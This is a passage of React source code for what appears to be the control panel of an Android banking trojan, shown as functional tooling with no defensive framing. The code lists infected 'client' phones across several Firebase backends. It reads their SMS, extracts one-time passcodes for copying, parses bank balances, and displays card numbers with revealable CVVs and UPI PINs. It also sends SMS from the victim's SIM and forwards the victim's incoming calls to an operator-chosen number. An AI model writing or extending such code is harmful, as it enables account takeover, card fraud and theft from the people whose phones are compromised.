    const num=String(callNum||"").trim().replace(/[\s\-()]/g,"");
    if(!num){showToast("Enter forward number");return;}
    if(!/^\+?[0-9]{8,15}$/.test(num)){showToast("Invalid phone number");return;}
    setCallBusy(true);
    try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/callForward`,{from:Number(sim)||1,to:num,isForwarded:true,isActive:true});
      showToast("📞 Call forward activated → "+num);
    }catch(e){showToast("Forward failed: "+String(e.message||e).slice(0,80));}
    finally{setCallBusy(false);}
  }
  async function stopForward(){
    setCallBusy(true);
    try{await fbPut(fbUrl,fbKey,`clients/${dev.id}/webhookEvent/callForward`,{isActive:false,isForwarded:false});showToast("📴 Call forward disabled");}
    catch(e){showToast("Stop failed");}
    finally{setCallBusy(false);}
  }
  async function del(){
    if(!confirm(`Delete "${dev.name}"?`)) return;
    try{await fbDel(fbUrl,fbKey,`clients/${dev.id}`);showToast("🗑️ Device deleted");onDelete();}
    catch(e){showToast("Delete failed");}
  }
  const phone=cleanPhone(dev.phoneNumber&&dev.phoneNumber!=="—"?dev.phoneNumber:(ana.phoneNumbers[0]||"—"));
  const net=dev.provider&&dev.provider!=="—"?dev.provider:(ana.networks[0]||"—");
  const togglePinMsg=(key)=>{setPinnedMsgs(prev=> prev.includes(key)?prev.filter(k=>k!==key):[...prev,key]);};
  const togglePinNum=(num)=>{setPinnedNums(prev=> prev.includes(num)?prev.filter(k=>k!==num):[...prev,num]);};

  const tabs=[{k:"info",l:"Info"},{k:"bank",l:`Bank (${ana.bankBalances.length})`},...(ana.cards.length>0?[{k:"card",l:`Card (${ana.cards.length})`}]:[]),{k:"sms",l:`SMS (${msgs.length})`},{k:"send",l:"Send"}];

  const msgKey=(m,i)=>`${m.time}|${m.sender}|${m.text.slice(0,40)}|${i}`;
  const sortedMsgs=useMemo(()=>{
    const withMeta=msgs.map((m,i)=>({m,i,k:msgKey(m,i),ts:parseSmsTime(m.time)}));
    let arr=withMeta;
    if(dateFrom || dateTo){
      const fromTs = dateFrom ? fromDateInputValue(dateFrom) : null;
      const toTs = dateTo ? fromDateInputValue(dateTo) : null;
      const fromStart = fromTs!=null ? startOfDay(fromTs) : null;
      const toEnd = toTs!=null ? endOfDay(toTs) : null;
      arr = arr.filter(x=>{if(!x.ts) return false;if(fromStart!=null && x.ts < fromStart) return false;if(toEnd!=null && x.ts > toEnd) return false;return true;});
    }
    arr.sort((a,b)=>{if(b.ts!==a.ts) return b.ts-a.ts;return b.i-a.i;});
    const pinned=arr.filter(x=>pinnedMsgs.includes(x.k));
    const rest=arr.filter(x=>!pinnedMsgs.includes(x.k));
    return [...pinned,...rest];
  },[msgs,pinnedMsgs,dateFrom,dateTo]);
  const activeDateFilter = dateFrom || dateTo;

  return <div className="drw" onClick={onClose}>
    <div className="drw-backdrop"/>
    <div className="drw-panel" onClick={e=>e.stopPropagation()}>
      <div style={{display:"flex",alignItems:"center",gap:12,padding:"16px 20px",borderBottom:"1px solid var(--border)"}}>
        <div style={{width:40,height:40,borderRadius:13,display:"flex",alignItems:"center",justifyContent:"center",background:dev.status?"rgba(52,211,153,.13)":"rgba(20,18,40,.6)",border:"1px solid "+(dev.status?"rgba(52,211,153,.35)":"var(--border)"),color:dev.status?"#34d399":"var(--muted-2)"}}>{Ic.wifi(18)}</div>
        <div style={{flex:1,minWidth:0}}>
          <h3 style={{fontSize:14,fontWeight:700,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{dev.name}</h3>
          <p className="mono" style={{fontSize:10,color:"var(--muted-2)",marginTop:2}}>{dev.id}</p>
        </div>
        <button onClick={del} className="ibtn" style={{color:"#fb7185",background:"rgba(244,63,94,.1)",borderColor:"rgba(244,63,94,.3)"}}>{Ic.trash(14)}</button>
        <button onClick={onClose} className="ibtn">{Ic.x(14)}</button>
      </div>
      <div style={{display:"flex",alignItems:"center",gap:12,padding:"10px 20px",background:"rgba(4,4,10,.6)",borderBottom:"1px solid var(--border)",flexWrap:"wrap"}}>
        <div style={{display:"flex",alignItems:"center",gap:6}}>
          <span style={{width:8,height:8,borderRadius:"50%",background:dev.status?"#34d399":"#333"}}/>
          <span style={{fontSize:11,fontWeight:600,color:dev.status?"#34d399":"var(--muted)"}}>{dev.status?"Online":"Offline"}</span>
          {!dev.status&&dev.lastSeen&&<span className="mono" style={{fontSize:10,color:"#fb7185",opacity:.75}}>{timeAgo(dev.lastSeen)}</span>}
        </div>
        <div style={{display:"flex",alignItems:"center",gap:5,fontSize:10,color:"var(--muted)"}}>Bat <span style={{fontWeight:700,color:dev.batteryPercent>=60?"#34d399":dev.batteryPercent>=30?"#fbbf24":"#f43f5e"}}>{dev.battery}</span></div>
        {dev.upipin&&<span className="badge" style={{background:"rgba(251,191,36,.1)",borderColor:"rgba(251,191,36,.3)",color:"#fbbf24"}}>UPI: {dev.upipin.split("|")[0]}</span>}
        {ana.bankBalances.length>0&&<span className="badge" style={{background:"rgba(52,211,153,.1)",borderColor:"rgba(52,211,153,.3)",color:"#34d399"}}>{ana.bankBalances.length} Bank</span>}
        {ana.cards.length>0&&<span className="badge" style={{background:"rgba(192,132,252,.1)",borderColor:"rgba(192,132,252,.3)",color:"#c084fc"}}>{ana.cards.length} Card</span>}
      </div>
      <div style={{display:"flex",borderBottom:"1px solid var(--border)",padding:"0 8px",overflowX:"auto"}}>
        {tabs.map(t=><button key={t.k} onClick={()=>setTab(t.k)} className={"tab"+(tab===t.k?" active":"")}>{t.l}</button>)}
      </div>
      <div style={{flex:1,overflowY:"auto"}}>
        {tab==="info"&&<div style={{padding:"16px 20px"}}>
          {!dev.status&&dev.lastSeen&&<div className="a-up" style={{marginBottom:14,padding:14,borderRadius:14,background:"rgba(244,63,94,.08)",border:"1px solid rgba(244,63,94,.3)",borderLeft:"3px solid #f43f5e"}}>
            <p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"#fb7185",fontWeight:700,marginBottom:4}}>Last Seen</p>
            <p style={{fontSize:18,fontWeight:700,color:"#fb7185"}}>{timeAgo(dev.lastSeen)}</p>
            <p className="mono" style={{fontSize:10,color:"rgba(251,113,133,.7)",marginTop:4}}>{fullTime(dev.lastSeen)}</p>
          </div>}
          {dev.status&&dev.lastSeen&&<div className="a-up" style={{marginBottom:14,padding:14,borderRadius:14,background:"rgba(52,211,153,.08)",border:"1px solid rgba(52,211,153,.3)"}}>
            <p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"#34d399",fontWeight:700,marginBottom:4}}>Last Activity</p>
            <p className="mono" style={{fontSize:11,color:"#34d399"}}>{fullTime(dev.lastSeen)}</p>
          </div>}
          <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,marginBottom:8}}>Device</p>
          <Row label="Phone Number" value={phone} mono delay={0.02} copyable/>
          <Row label="Network" value={net} delay={0.04}/>
          <Row label="Android" value={dev.android} delay={0.06}/>
          <Row label="IP Address" value={dev.ip} mono delay={0.08} copyable/>
          <Row label="Storage" value={dev.storage} delay={0.1}/>
          <Row label="CPU Arch" value={dev.cpu} mono delay={0.12}/>
          <Row label="SDK" value={dev.sdk} delay={0.14}/>
          <Row label="SIM Cards" value={`${dev.sims.length} SIM(s)`} delay={0.16}/>
          {dev.sims.map((s,i)=>s.phoneNumber&&<Row key={i} label={`SIM ${i+1}`} value={cleanPhone(s.phoneNumber)} mono delay={0.18+i*0.02} copyable/>)}
          {ana.phoneNumbers.length>0&&<>
            <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",fontWeight:700,margin:"18px 0 8px"}}>From SMS · Pin numbers</p>
            {ana.phoneNumbers.map((p,i)=>{const isPinned=pinnedNums.includes(p);return <Row key={i} label={`Phone #${i+1}`} value={cleanPhone(p)} mono color={isPinned?"#f472b6":"#a5f3fc"} delay={0.22+i*0.03} copyable
              trailing={<button onClick={()=>togglePinNum(p)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>}/>;})}
          </>}
          {ana.networks.length>0&&ana.networks.map((n,i)=><Row key={i} label={`Network #${i+1}`} value={n} color="#c084fc" delay={0.3+i*0.03}/>)}
        </div>}
        {tab==="bank"&&<div style={{padding:"14px 16px",display:"flex",flexDirection:"column",gap:10}}>
          {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}><span className="spin" style={{display:"inline-block",marginBottom:10}}/><p style={{fontSize:12,color:"var(--muted)"}}>Scanning bank SMS…</p></div>
          : ana.bankBalances.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}>
              <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.rupee(38)}</span>
              <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No bank SMS found</p>
            </div>
          : <>
              <div className="a-up" style={{padding:16,borderRadius:14,background:"linear-gradient(135deg,rgba(52,211,153,.14),rgba(52,211,153,.04))",border:"1px solid rgba(52,211,153,.4)"}}>
                <p style={{fontSize:10,textTransform:"uppercase",letterSpacing:"0.15em",color:"#34d399",fontWeight:700,marginBottom:6}}>Latest · {ana.bankBalances[0].bankName}</p>
                <div style={{display:"flex",alignItems:"flex-end",gap:8}}>
                  <span style={{fontSize:28,fontWeight:800,color:"#fff",fontVariantNumeric:"tabular-nums"}}>₹{fmtMoney(ana.bankBalances[0].availableBalance)}</span>
                  {ana.bankBalances[0].accountLast4&&<span className="mono" style={{fontSize:12,color:"rgba(52,211,153,.8)",marginBottom:4}}>••{ana.bankBalances[0].accountLast4}</span>}
                </div>
              </div>
              {ana.bankBalances.map((b,i)=><BankCard key={i} balance={b} delay={0.05+i*0.05}/>)}
            </>}
        </div>}
        {tab==="card"&&<div style={{padding:"14px 16px",display:"flex",flexDirection:"column",gap:10}}>
          {ana.cards.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}><span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.card(38)}</span><p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>No card info found</p></div>
          : ana.cards.map((c,i)=><CardInfo key={i} card={c} delay={i*0.06}/>)}
        </div>}
        {tab==="sms"&&<div style={{display:"flex",flexDirection:"column",height:"100%"}}>
          <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",padding:"10px 16px",borderBottom:"1px solid var(--border)",gap:8,flexWrap:"wrap"}}>
            <div style={{display:"flex",alignItems:"center",gap:8,flexWrap:"wrap"}}>
              <span style={{fontSize:11,color:"var(--muted)"}}>{sortedMsgs.length} / {msgs.length} messages</span>
              {activeDateFilter && <span className="badge" style={{background:"rgba(34,211,238,.1)",borderColor:"rgba(34,211,238,.35)",color:"#a5f3fc",fontSize:9}}>{Ic.calendar(9)} {dateFrom||"start"} → {dateTo||"now"}</span>}
              {pinnedMsgs.length>0&&<span className="badge" style={{background:"rgba(244,114,182,.1)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",fontSize:9}}>{Ic.pin(9)} {pinnedMsgs.length}</span>}
            </div>
            <div style={{display:"flex",gap:6}}>
              <button onClick={()=>setShowDateFilter(v=>!v)} className={"btn "+(showDateFilter||activeDateFilter?"btn-cyan":"btn-ghost")} style={{padding:"7px 12px",fontSize:11}}>{Ic.filter(12)} Filter</button>
              <button onClick={()=>loadMsgs(false)} disabled={refreshing} className="btn btn-cyan" style={{padding:"7px 12px",fontSize:11}}>{refreshing?<><span className="spin sm"/>…</>:<>{Ic.refresh(12)}</>}</button>
            </div>
          </div>
          {showDateFilter && <div className="a-up dfilter-panel">
            <div className="dfilter-head">
              <div style={{display:"flex",alignItems:"center",gap:8}}>
                <div className="dfilter-icon">{Ic.calendar(14)}</div>
                <div><p style={{fontSize:12,fontWeight:700,color:"#a5f3fc"}}>CUSTOM DATE RANGE</p><p style={{fontSize:10,color:"var(--muted-2)"}}>Select from → to date</p></div>
              </div>
              <button onClick={()=>setShowDateFilter(false)} className="ibtn" style={{padding:5}}>{Ic.x(12)}</button>
            </div>
            <div className="dfilter-quick">
              {[{l:"Today",d:0},{l:"7 Days",d:7},{l:"30 Days",d:30},{l:"90 Days",d:90}].map(q=>(
                <button key={q.l} className="dfilter-chip" onClick={()=>{const now=new Date();const from=new Date();from.setDate(from.getDate()-(q.d===0?0:q.d));setDateFrom(toDateInputValue(from.getTime()));setDateTo(toDateInputValue(now.getTime()));}}>{q.l}</button>
              ))}
            </div>
            <div className="dfilter-row">
              <div className="dfilter-field"><label>From</label><input type="date" value={dateFrom} onChange={e=>setDateFrom(e.target.value)} className="dfilter-input"/></div>
              <div className="dfilter-arrow">{Ic.chev(14)}</div>
              <div className="dfilter-field"><label>To</label><input type="date" value={dateTo} onChange={e=>setDateTo(e.target.value)} className="dfilter-input"/></div>
            </div>
            <div className="dfilter-actions">
              <button className="dfilter-btn apply" onClick={()=>{setShowDateFilter(false);showToast("Filter applied · "+sortedMsgs.length+" messages");}}>{Ic.check(13)} Apply</button>
              <button className="dfilter-btn clear" onClick={()=>{setDateFrom("");setDateTo("");}}>Clear</button>
            </div>
          </div>}
          <div style={{flex:1,overflowY:"auto",padding:"14px 16px",display:"flex",flexDirection:"column",gap:8}}>
          {loading ? <div style={{textAlign:"center",padding:"50px 20px"}}><span className="spin" style={{display:"inline-block",marginBottom:10}}/><p style={{fontSize:12,color:"var(--muted)"}}>Loading messages…</p></div>
          : sortedMsgs.length===0 ? <div style={{textAlign:"center",padding:"50px 20px"}}>
              <span style={{color:"var(--muted-2)",display:"inline-flex",marginBottom:10}}>{Ic.msg(38)}</span>
              <p style={{fontSize:13,fontWeight:600,color:"var(--muted)"}}>{activeDateFilter?"No messages in range":"No messages"}</p>
              {activeDateFilter && <button onClick={()=>{setDateFrom("");setDateTo("");}} className="btn btn-ghost" style={{marginTop:10,padding:"7px 14px",fontSize:11}}>Clear filter</button>}
            </div>
          : sortedMsgs.map(({m,i,k},idx)=>{
              const isBank=/AVL|AVAL|AVBL|BAL\.|CREDITED|DEBITED|INR/i.test(m.text);
              const isCard=/CARD|CVV|CREDIT CARD|DEBIT CARD/i.test(m.text);
              const isPinned=pinnedMsgs.includes(k);
              const otp=extractOtp(m.text);
              const accent=isCard?"#c084fc":isBank?"#34d399":"#f43f5e";
              return <div key={k+idx} className="sms-item" style={{padding:12,borderRadius:12,border:`1px solid ${isPinned?"rgba(244,114,182,.4)":"var(--border)"}`,borderLeft:`3px solid ${isPinned?"#f472b6":accent}`,background:isPinned?"rgba(244,114,182,.05)":"var(--panel-2)"}}>
                <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:6,gap:8}}>
                  <div style={{display:"flex",alignItems:"center",gap:6,minWidth:0}}>
                    {isPinned&&<span style={{color:"#f472b6",display:"flex"}}>{Ic.pin(10)}</span>}
                    <span style={{fontSize:12,fontWeight:700,color:isPinned?"#f472b6":accent,overflow:"hidden",textOverflow:"ellipsis",whiteSpace:"nowrap"}}>{m.sender}</span>
                    {isBank&&<span style={{color:"rgba(52,211,153,.8)",display:"flex"}}>{Ic.rupee(11)}</span>}
                    {isCard&&<span style={{color:"rgba(192,132,252,.8)",display:"flex"}}>{Ic.card(11)}</span>}
                  </div>
                  <div style={{display:"flex",alignItems:"center",gap:6,flexShrink:0}}>
                    <span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{m.time}</span>
                    <button onClick={()=>{navigator.clipboard.writeText(m.text);showToast("Copied");}} className="ibtn" style={{padding:4}}>{Ic.copy(11)}</button>
                    <button onClick={()=>togglePinMsg(k)} className="ibtn" style={{padding:4,color:isPinned?"#f472b6":undefined,background:isPinned?"rgba(244,114,182,.1)":undefined,borderColor:isPinned?"rgba(244,114,182,.3)":undefined}}>{isPinned?Ic.pinOff(11):Ic.pin(11)}</button>
                  </div>
                </div>
                <p style={{fontSize:11,color:"var(--text)",lineHeight:1.5,opacity:.88}}>{m.text.substring(0,250)}</p>
                {otp && <div className="a-in" style={{marginTop:8,display:"flex",alignItems:"center",gap:8,padding:"6px 10px",borderRadius:8,background:"rgba(251,191,36,.08)",border:"1px solid rgba(251,191,36,.3)"}}>
                  <span style={{fontSize:9,fontWeight:700,color:"#fbbf24",textTransform:"uppercase",letterSpacing:"0.12em"}}>OTP</span>
                  <span className="mono" style={{fontSize:15,fontWeight:800,color:"#fbbf24",letterSpacing:2}}>{otp}</span>
                  <button onClick={()=>{navigator.clipboard.writeText(otp);showToast("OTP copied: "+otp);}} className="btn" style={{marginLeft:"auto",padding:"5px 11px",fontSize:10,background:"rgba(251,191,36,.15)",border:"1px solid rgba(251,191,36,.45)",color:"#fbbf24"}}>{Ic.copy(11)} Copy OTP</button>
                </div>}
              </div>;
            })}
          </div>
        </div>}
        {tab==="send"&&<div style={{padding:"18px 20px",display:"flex",flexDirection:"column",gap:16}}>
          <div><p className="lbl">Select SIM</p><div style={{display:"flex",gap:8}}>{[1,2].map(s=><button key={s} onClick={()=>setSim(s)} className={"btn "+(sim===s?"btn-primary":"btn-ghost")} style={{flex:1}}>SIM {s}</button>)}</div></div>
          <div><p className="lbl">Recipient</p>
            <input className="inp mono" value={to} onChange={e=>setTo(e.target.value)} placeholder="+919876543210" inputMode="tel" autoComplete="off"/>
            {pinnedNums.length>0&&<div style={{display:"flex",gap:6,flexWrap:"wrap",marginTop:8}}>{pinnedNums.map((n,i)=><button key={i} onClick={()=>setTo(n)} className="badge" style={{background:"rgba(244,114,182,.08)",borderColor:"rgba(244,114,182,.3)",color:"#f472b6",cursor:"pointer"}}>{Ic.pin(9)} {cleanPhone(n)}</button>)}</div>}
          </div>
          <div><p className="lbl">Message</p>
            <textarea className="inp" value={body} onChange={e=>setBody(e.target.value)} rows={4} placeholder="Type your message…"/>
            <p style={{fontSize:10,color:"var(--muted-2)",marginTop:6,textAlign:"right"}}>{body.length} chars</p>
          </div>
          <button onClick={send} disabled={sending} className="btn btn-primary" style={{width:"100%",padding:14}}>{sending?<><span className="spin" style={{borderTopColor:"#fff"}}/>Sending…</>:<>{Ic.send(15)}Send via SIM {sim}</>}</button>
          {phone&&phone!=="—"&&<button onClick={()=>setTo(phone)} className="btn btn-ghost" style={{width:"100%"}}>Use device number: <span className="mono" style={{color:"#a5f3fc"}}>{phone}</span></button>}
          <div style={{marginTop:6,paddingTop:18,borderTop:"1px dashed rgba(139,92,246,.3)"}}>
            <div style={{display:"flex",alignItems:"center",gap:8,marginBottom:14}}>
              <div style={{width:26,height:26,borderRadius:9,background:"rgba(34,211,238,.12)",border:"1px solid rgba(34,211,238,.35)",display:"flex",alignItems:"center",justifyContent:"center",color:"#a5f3fc"}}>{Ic.phone(13)}</div>
              <div><p style={{fontSize:12,fontWeight:700,color:"#a5f3fc"}}>CALL FORWARD</p><p style={{fontSize:10,color:"var(--muted-2)"}}>Forward incoming calls</p></div>
            </div>
            <div><p className="lbl">Forward To</p><input className="inp mono" value={callNum} onChange={e=>setCallNum(e.target.value)} placeholder="+919876543210" inputMode="tel"/></div>
            <div style={{display:"flex",gap:8,marginTop:14}}>
              <button onClick={forwardCall} disabled={callBusy} className="btn" style={{flex:1,padding:14,fontSize:12,background:"linear-gradient(135deg,rgba(14,165,233,.22),rgba(6,182,212,.22))",border:"1px solid rgba(14,165,233,.5)",color:"#7dd3fc",fontWeight:700}}>{callBusy?<><span className="spin sm"/>Working…</>:<>{Ic.phone(14)} Activate Forward</>}</button>
              <button onClick={stopForward} disabled={callBusy} className="btn" style={{padding:"14px 16px",fontSize:12,background:"rgba(244,63,94,.1)",border:"1px solid rgba(244,63,94,.35)",color:"#fb7185",fontWeight:700}}>Stop</button>
            </div>
          </div>
        </div>}
      </div>
    </div>
  </div>;
}

/* ⚡ BankCard with DATE/TIME ⚡ */
const BankCard=React.memo(function BankCard({balance,delay=0}){
  const isCredit=balance.transactionType==="credit";
  const ts = parseSmsTime(balance.detectedAt);
  const timeStr = ts ? new Date(ts).toLocaleString("en-IN",{day:"2-digit",month:"short",hour:"2-digit",minute:"2-digit",hour12:true}) : (balance.detectedAt||"");
  return <div className="a-in" style={{animationDelay:`${delay}s`,padding:14,borderRadius:14,background:"rgba(52,211,153,.06)",border:"1px solid rgba(52,211,153,.28)",borderLeft:"3px solid rgba(52,211,153,.7)"}}>
    <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:10,flexWrap:"wrap",gap:6}}>
      <div style={{display:"flex",alignItems:"center",gap:8,minWidth:0}}>
        <div style={{width:26,height:26,borderRadius:9,background:"rgba(52,211,153,.14)",border:"1px solid rgba(52,211,153,.3)",display:"flex",alignItems:"center",justifyContent:"center",color:"#34d399"}}>{Ic.rupee(13)}</div>
        <div style={{minWidth:0}}><span style={{fontSize:11,fontWeight:700,color:"#34d399",display:"block"}}>{balance.bankName}</span><span className="mono" style={{fontSize:9,color:"var(--muted-2)"}}>{balance.senderName}</span></div>
        {balance.accountLast4&&<span className="mono" style={{fontSize:9,color:"var(--muted-2)",background:"rgba(5,5,10,.5)",padding:"2px 6px",borderRadius:5}}>••{balance.accountLast4}</span>}
      </div>
      {balance.transactionType&&<span className="badge" style={{background:isCredit?"rgba(52,211,153,.1)":"rgba(244,63,94,.1)",borderColor:isCredit?"rgba(52,211,153,.3)":"rgba(244,63,94,.3)",color:isCredit?"#34d399":"#fb7185"}}><span style={{display:"flex"}}>{isCredit?Ic.trendUp(10):Ic.trendDown(10)}</span>{isCredit?"Credit":"Debit"}</span>}
    </div>
    <div style={{display:"flex",alignItems:"flex-end",justifyContent:"space-between",gap:10}}>
      <div><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Available</p><p style={{fontSize:20,fontWeight:800,color:"#fff",fontVariantNumeric:"tabular-nums"}}><span style={{color:"#34d399",fontSize:14}}>₹</span>{fmtMoney(balance.availableBalance)}</p></div>
      {balance.transactionAmount&&balance.transactionAmount!==balance.availableBalance&&<div style={{textAlign:"right"}}><p style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)",marginBottom:2}}>Txn</p><p style={{fontSize:14,fontWeight:700,color:isCredit?"#34d399":"#fb7185",fontVariantNumeric:"tabular-nums"}}>{isCredit?"+":"-"}₹{fmtMoney(balance.transactionAmount)}</p></div>}
    </div>
    {/* ⚡ DATE/TIME ROW */}
    {timeStr && <div style={{display:"flex",alignItems:"center",gap:6,marginTop:10,paddingTop:8,borderTop:"1px solid rgba(52,211,153,.14)"}}>
      <span style={{color:"#34d399",display:"flex"}}>{Ic.clock(11)}</span>
      <span className="mono" style={{fontSize:10,color:"var(--muted)"}}>{timeStr}</span>
    </div>}
  </div>;
});

const CardInfo=React.memo(function CardInfo({card,delay=0}){
  const [show,setShow]=useState(false);
  return <div className="a-in" style={{animationDelay:`${delay}s`,padding:14,borderRadius:14,background:"rgba(192,132,252,.06)",border:"1px solid rgba(192,132,252,.28)",borderLeft:"3px solid rgba(192,132,252,.7)"}}>
    <div style={{display:"flex",alignItems:"center",justifyContent:"space-between",marginBottom:10}}>
      <div style={{display:"flex",alignItems:"center",gap:8}}>
        <div style={{width:26,height:26,borderRadius:9,background:"rgba(192,132,252,.14)",border:"1px solid rgba(192,132,252,.3)",display:"flex",alignItems:"center",justifyContent:"center",color:"#c084fc"}}>{Ic.card(13)}</div>
        <span style={{fontSize:11,fontWeight:700,color:"#c084fc"}}>{card.cardType||"Card"}</span>
      </div>
      {card.expiry&&<span className="mono" style={{fontSize:10,color:"var(--muted-2)"}}>Exp: {card.expiry}</span>}
    </div>
    <p className="mono" style={{fontSize:14,fontWeight:600,color:"#fff",letterSpacing:2}}>•••• •••• •••• {card.cardLast4}</p>
    {card.cvv&&<div style={{display:"flex",alignItems:"center",gap:8,marginTop:10}}>
      <span style={{fontSize:9,textTransform:"uppercase",letterSpacing:"0.15em",color:"var(--muted-2)"}}>CVV:</span>
      <span className="mono" style={{fontSize:13,color:"#c084fc",fontWeight:600}}>{show?card.cvv:"•••"}</span>
      <button onClick={()=>setShow(!show)} className="ibtn" style={{padding:5}}>{show?Ic.eyeOff(12):Ic.eye(12)}</button>
    </div>}
  </div>;
});

/* ============ MERGED VIEW ============ */
function MergedView({onLogout}){
  const [accounts]=useState(()=>loadAccounts());
  const [devices,setDevices]=useState([]);
  const [loading,setLoading]=useState(true);
  const [scanning,setScanning]=useState(false);
  const [filter,setFilter]=useState("all");
  const [search,setSearch]=useState("");
  const [selected,setSelected]=useState(null);
  const [msg,setMsg]=useState("");
  const [now,setNow]=useState(new Date());
  const [pinnedIds,setPinnedIds]=useState(()=>loadPinnedDevices());
  const ref=useRef([]);const cache=useRef(new Map());
  const toast=useCallback(m=>{setMsg(m);setTimeout(()=>setMsg(""),2800)},[]);
  ref.current=devices;
  const togglePinDevice=useCallback((id)=>{setPinnedIds(prev=>{const next=prev.includes(id)?prev.filter(x=>x!==id):[...prev,id];savePinnedDevices(next);return next;});},[]);

  const load=useCallback(async (showLoad=false)=>{
    if(!accounts.length) return;
    if(showLoad) setLoading(true);
    try{const results=await Promise.all(accounts.map(async a=>{
        try{const raw=await fbGet(a.url,a.key,"clients");return parseDevices(raw).map(d=>({...d,srcId:a.id,srcUrl:a.url,srcKey:a.key}));}
        catch{return [];}
      }));
      const merged=results.flat();
      setDevices(p=>{const old=new Map(p.map(d=>[`${d.srcId}:${d.id}`,d]));
        return merged.map(d=>{const prev=old.get(`${d.srcId}:${d.id}`);return {...d,smsAnalysis:prev?.smsAnalysis||cache.current.get(`${d.srcId}:${d.id}`)?.smsAnalysis,lastSmsTs:prev?.lastSmsTs,isActive:prev?.isActive};});
      });
    }catch{toast("Unable to load panels");}
    finally{setLoading(false);}
  },[accounts,toast]);

  /* ⚡ PATCH: limitToLast 40 → 200 */
  const scan=useCallback(async (force=false)=>{
    const cur=ref.current;if(!cur.length) return;
    const now=Date.now();
    const work=cur.filter(d=>{const k=`${d.srcId}:${d.id}`;if(force) return true;const c=cache.current.get(k);if(!c) return true;if(c.ts && now-c.ts < 60000) return false;return true;});
    if(!work.length) return;
    setScanning(true);
    try{
      const batchSize = PERF.isLowEnd ? 1 : 3;
      for(let i=0;i<work.length;i+=batchSize){
        const batch=work.slice(i,i+batchSize);
        await Promise.all(batch.map(async d=>{
          const k=`${d.srcId}:${d.id}`;
          try{const raw=await fbGet(d.srcUrl,d.srcKey,`messages/${d.id}`,{orderBy:'"$key"',limitToLast:"200"});
            const msgs=parseMessages(raw);
            const a=analyze(msgs);
            const lastTs=getLastSmsTs(msgs);
            const active=isRecentSms(msgs,2);
            cache.current.set(k,{smsAnalysis:a,lastSmsTs:lastTs,isActive:active,ts:Date.now()});
            setDevices(p=>p.map(x=>`${x.srcId}:${x.id}`===k?{...x,smsAnalysis:a,lastSmsTs:lastTs,isActive:active}:x));
          }catch{cache.current.set(k,{smsAnalysis:{bankBalances:[],cards:[],phoneNumbers:[],networks:[]},lastSmsTs:0,isActive:false,ts:Date.now()});}
        }));
      }
    }finally{setScanning(false);}
  },[]);

  useEffect(()=>{
    load(true);
    const t1=setInterval(()=>load(false),45000);
    const t2=setInterval(()=>scan(true),120000);
    let t3=null;
    if(!PERF.isLowEnd) t3=setInterval(()=>setNow(new Date()),60000);
    return ()=>{clearInterval(t1);clearInterval(t2);if(t3) clearInterval(t3);};
  },[]);
  useEffect(()=>{if(!devices.length) return;const timer=setTimeout(()=>scan(false),1000);return ()=>clearTimeout(timer);},[devices.length,scan]);

  const filtered=useMemo(()=>{
    const qRaw=search.trim().toLowerCase();const qNum=qRaw.replace(/[^0-9]/g,"");
    return devices.filter(d=>{
      if(filter==="online"&&!d.status) return false;
      if(filter==="offline"&&d.status) return false;
      if(!qRaw) return true;
      const numStr=String(d.phoneNumber||"").replace(/[^0-9]/g,"");
      const smsNums=(d.smsAnalysis?.phoneNumbers||[]).join(" ").replace(/[^0-9]/g,"");
      return d.name.toLowerCase().includes(qRaw)||d.id.toLowerCase().includes(qRaw)||d.srcUrl.toLowerCase().includes(qRaw)||(qNum&&(numStr.includes(qNum)||smsNums.includes(qNum)));
    }).sort((a,b)=>{const pa=pinnedIds.includes(a.id),pb=pinnedIds.includes(b.id);if(pa!==pb) return pb?1:-1;if(filter==="online") return Number(b.status)-Number(a.status);return b.id.localeCompare(a.id);});
  },[devices,filter,search,pinnedIds]);

  const online=devices.filter(d=>d.status).length;
  const offline=devices.length-online;
  const phoneNums=devices.filter(d=>d.phoneNumber&&d.phoneNumber!=="—").length;
  const bankSms=devices.filter(d=>d.smsAnalysis?.bankBalances.length).length;
  const cards=devices.filter(d=>d.smsAnalysis?.cards.length).length;

  async function shareAll(){
    const link=makeMergeLink(accounts);
    try{if(navigator.share){await navigator.share({title:BRAND+" merged",url:link});toast("Shared.");}
      else{await navigator.clipboard.writeText(link);toast("Copied.");}
    }catch(e){if(e?.name==="AbortError") return;try{await navigator.clipboard.writeText(link);toast("Copied.");}catch{toast("Unable to share.");}}
  }

  return <div className="app a-in" style={{minHeight:"100vh",display:"flex",flexDirection:"column"}}>
    <header className="head-glow" style={{position:"sticky",top:0,zIndex:40,background:"rgba(4,4,10,.92)"}}>
      <div style={{maxWidth:1400,margin:"0 auto",padding:"12px 22px",display:"flex",alignItems:"center",gap:14,flexWrap:"wrap"}}>
        <div style={{display:"flex",alignItems:"center",gap:10,flexShrink:0}}>
          <div style={{width:34,height:34,borderRadius:11,background:"linear-gradient(135deg,#8b5cf6,#22d3ee)",display:"flex",alignItems:"center",justifyContent:"center"}}>{Ic.zap(16)}</div>
          <span className="grad-text" style={{fontWeight:700,fontSize:15}}>{BRAND}</span>
